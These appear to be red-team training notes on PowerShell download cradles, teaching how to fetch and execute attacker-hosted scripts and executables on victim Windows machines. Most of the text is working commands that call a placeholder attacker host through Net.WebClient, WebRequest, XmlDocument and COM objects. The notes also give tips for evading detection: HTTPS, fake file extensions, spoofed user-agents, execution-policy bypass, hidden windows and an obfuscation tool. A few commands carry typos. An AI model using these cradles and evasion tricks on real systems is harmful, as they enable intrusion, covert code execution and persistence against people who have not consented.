

# Downloading & Execution Overview

The ability to download and execute files on our target systems is, of course, a necessary process in 
our quest to maintain footholds and persistance within a target network


Being able to do so with tools that are already built in (i.e. living off the land) is even more 
important as it helps evade endpoint security measures and application whitelisting solutions by using
tools that are likely already "trusted"


Additionally, being able to download and execute files with PowerShell is even more advantageous in many 
cases, because we're able to operate entirely within the memory process of PowerShell and can avoid dropping 
artifacts to disk in many cases




# Primary ways for downloading and executing code using PowerShell/.NET classes or COM objects

1. An executable or script is downloaded to disk, which can then be executed by PowerShell itself, 
or by using other executables on the system to execute our code

2. An executable or script is downloaded and run within the PowerShell process memory, and never touches
the disk (Preferred Method)




# Summary of methods we can use for "in memory" execution with PowerShell v2.0 (Preferred methods)

Net.WebClient DownloadString Method

Net.WebClient DownloadData Method

Net.WebClient OpenRead Method

.NET [Net.HttpWebRequest] Class

Word.Application COM Object

Excel.Application COM Object

InternetExplorer.Application COM Object

MsXml2.ServerXmlHttp COM Object

Certutil.exe w/ -ping argument




# Summary of methods we can use for "Disk-Based" execution with PowerShell v2.0

Net.WebClient DownloadFile Method

BITSAdmin.exe

Certutil.exe w/ -urlcache argument



These two methods (in-memory and disk-based) are usually accomplished using what are commonly 
referred to as "Download Cradles" and use the "System.Net.WebClient" .Net System Class among
other classes, COM Objects or other Windows-native executables to achieve this


Most of the time, we use the New-Object cmdlet

The New-Object cmdlet, as its name infers, allows us to create instances (objects ) of either .Net or
COM objects


# Net.WebClient DownloadString Method

The most common download cradle we'll see in the field uses the "iex" (Invoke-Expression) alias along
with the Net.WebClient class and the DownloadString method, which downloads and executes a remotely hosted
PowerShell script, and can be done with a command like the following: 


PS C:\> iex (New-Object Net.WebClient).DownloadString("http://attacker_url/script.ps1")


We can run the same command from a standard windows command prompt


C:\> powershell.exe iex (New-Object Net.WebClient).DownloadString('http://attacker_url/script.ps1')


The DownloadString URL using cmd prompt uses single quotes instead of double quotes


We can also break the above commands down and execute them directly via the console with something like
this as well

PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_url/script.ps1"
PS C:\> $command = $downloader.DownloadString($payload)
PS C:\> Invoke-Expression $command



To demonstrate how this works we can create a really simple single-command PowerShell script with 
the following contents, which we then host on our attacker system:

Get-Process | Format-List -Property Name,Path

Then from our PowerShell console on the victim machine we can download and call our script using the 
following Invoked-Expression (iex) command: 

iex (New-Object Net.WebClient).DownloadString("http://attacker_ip/Get-ProcessPaths.ps1")


The DownloadString method will execute our remote script in the PowerShell process memory, so in 
regard to not dropping an artifact to disk, its a great way to stay under the radar of endpoint
security solutions that are not monitoring PowerShell memory


# Important: Evasion Tips

It should be noted that where possible when hosting your remote PowerShell script, to have an SSL
Certificate configured on the attacker machine

This helps in evading over-the-wire heuristics as our traffic will go over https and be encrypted

In the previous example, we used http, which could be easily detected


Another trick we can use which might help in evading basic file extension heuristics is to give our 
PowerShell script a different extension, for instance, "Logo.gif" PowerShell will still execute it as
a .ps1 script


It's also important to note that the Net.WebClient class allows us to specify a custom user-agent string
when sending the request to our attacker URL

This can help us evade detection mechanisms that are flagging abnormal user-agent strings crossing the
wire


we can do that with the Headers.Add method


PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0" (Windows NT 10.0; Win64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146)
PS C:\> $payload = "http://attacker_url/script.ps1"
PS C:\> $command = $downloader.DownloadString($payload)
PS C:\> Invoke-Expression $command


When we analyze the Net.WebClient GET request we should see that the user-agent string was sent as 
part of it




# Net.WebClient DownloadFile Method

Another Net.WebClient class method we can use is the DownloadFile method, this method will download your
executable to disk

Although it is noisy and not reccomended if trying to remain stealthy, its still sometimes a handy method
to quickly download a file to the target system


PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_url/payload.exe"
PS C:\> $local_file = "C:\programdata\payload.exe"
PS C:\> $downloader.DownloadFile($payload,$local_file)

the Local File variable is where the file will be saved to



Executing the file once its on our target system can be accomplished using the call operator (&) and
variable we created for the payload ($local_file): 

PS C:\> & $local_file



It should also be noted that the Net.WebClient class methods can be configured to use the systems'
proxy and default credentials with the following commands:



PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_url/script.ps1"
PS C:\> $cmd = downloader.DownloadFile($payload)
PS C:\> $proxy = [Net.WebRequest]::GetSystemWebProxy()
PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS C:\> $downloader.Proxy = $proxy
PS C:\> iex $cmd


Aside from the Net.WebClient class, we can also use the Net.WebRequest class to download and excute 
scripts on a target, in memory

PS C:\> $req = [System.Net.WebRequest]::Create("http://attacker_url/script.ps1")
PS C:\> $res = $req.GetResponse()
PS C:\> iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()



The first line instantiates our System.Net.WebRequest class as the $req variable

The second line creates a $res variable to store the WebRequest response

The third line uses the Invoke-Expression alias (iex) to invoke the System.IO.StreamReader and 
execute our code



Similiar to the Net.WebClient class, the Net.WebRequest class can also be configured to use a proxy as 
follows:


PS C:\> $req = [System.Net.WebRequest]::Create("http://attacker_url/script.ps1")
PS C:\> $res = $req.GetResponse()
PS C:\> $proxy = [Net.WebRequest]::GetSystemWebProxy()
PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS C:\> $req.Proxy = $proxy
PS C:\> iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()


# System.Xml.XmlDoxument

The System.Xml.XmlDocument class allows us to execute a PowerShell command (or any system command) contained
within an attacker hosted XML document and is another great way to execute PowerShell code in memory, and 
in a way that is likely not detected, especially when combined with a server over HTTPS



What we'll want to create is an XML file with the following contents, which we'll host on our attacker
machine:


//the hashtag is here so the code doesnt mess with this MD doc
#<?xml version="1.0"?>
<command>
	<a>
		<execute>Get-Process</execute>
	</a>
</command>


The above xml file will simply list the system processes when executed


Next once our XML file is hosted, we can use the System.Xml.XmlDocument class with the "Load" method to
download and execute it


PS C:\> $xmldoc = New-Object System.Xml.XmlDocument
PS C:\> $xmldoc.Load("http://attacker_url/file.xml")
PS C:\> iex $xmldoc.command.a.execute



# COM Objects for Download & Execution


We can also use COM Objects to both download and execute scripts on a target system. Some of the COM
Objects available to us for this purpose are: 

Msxml2.XMLHTTP

Microsoft.XMLHTTP

InternetExplorer.Application

Excel.Application

Word.Application

MsXml2.ServerXmlHttp

WinHttp.WinHttpRequest.5.1 (Not Proxy Aware)



Take note that all of the above COM Objects are proxy-aware, and will by default, use system configured
proxies, except for the "WinHttp.WinHttpRequest.5.1" object, although that object can be configured to use
one if needed



We can utilize the COM Objects in the same way we do with the Net.WebClient objects, by using the 
New-Object cmdlet, but with the -ComObject parameter

In the below, we're utilizing the "Msxml2.XMLHTTP" object for executing a remotely hosted PowerShell
script:

PS C:\> $downloader = New-Object -ComObject Msxm12.XMLHTTP
PS C:\> $downloader.open("GET", "http://attacker_URL/script.ps1", $false)
PS C:\> $downloader.send()
PS C:\> iex $downloader.responseText


# WinHttp.WinHttpRequest.5.1 COM Object

We can do the same as well with the WinHttp.WinHttpRequest.5.1 object as well:

PS C:\> $downloader = New-Object -ComObject WinHttp.WinHttpRequest.5.1
PS C:\> $downloader.open("GET", "http://attacker_URL/script.ps1", $false)
PS C:\> $downloader.send()
PS C:\> iex $downloader.responseText


Keep in mind, that all of the previous slides and future multi-line commands we're showing as examples,
can also be done as one-liners, by using a semicolon (;) to break up the commands


Alternatively, it can be wrapped up into a script file and be executed that way as well: 


PS C:\> .\downloader.ps1

or 

C:\> powershell.exe .\downloader.ps1



# ExecutionPolicy Bypass and Hidden Window


With all of these examples, when executing the download cradles from a windows command prompt or shell, 
or when launching the powershell.exe executable, make sure to include the -ExecutionPolicy Bypass and
-Window Hidden options we covered in the fundamentals module

This will ensure we can run our scripts and that the PowerShell window stays hidden from the end-user


C:\> powershell.exe -ExecutionPolicy Bypass -Window Hidden .\downloader.ps1


A great tool we can use to help us craft obfuscated download cradles is known as "Invoke-CradleCrafter" 
by Daniel Bohannon



# Resources

Invoke_CradeCrafter: https://github.com/danielbohannon/Invoke-CradleCrafter

